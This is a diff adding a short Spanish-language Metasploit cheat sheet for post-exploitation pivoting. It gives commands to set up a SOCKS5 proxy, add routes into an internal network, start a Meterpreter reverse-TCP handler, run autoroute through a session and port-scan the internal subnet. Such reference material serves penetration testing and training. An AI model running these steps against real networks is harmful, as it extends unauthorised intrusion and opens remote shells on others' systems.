@@ -1,0 +1,24 @@
+▶ Configurar SOCKS Proxy (Crear proxy SOCKS5):
+  use auxiliary/server/socks_proxy
+  set VERSION 5
+  set SRVPORT 9050
+  run
+
+▶ Usar Route para Pivoting (Añadir ruta a red interna):
+  route add 192.168.1.0 255.255.255.0 1
+
+▶ Crear Túnel Reverso (Configurar Meterpreter reverso):
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set LHOST 0.0.0.0
+  set LPORT 4444
+  exploit -j
+
+▶ Pivoting con Meterpreter (Enrutar tráfico por sesión):
+  meterpreter > run autoroute -s 192.168.1.0/24
+
+▶ Escanear Red Interna (Usar módulo de escaneo):
+  use auxiliary/scanner/portscan/tcp
+  set RHOSTS 192.168.1.0/24
+  set THREADS 10
+  run
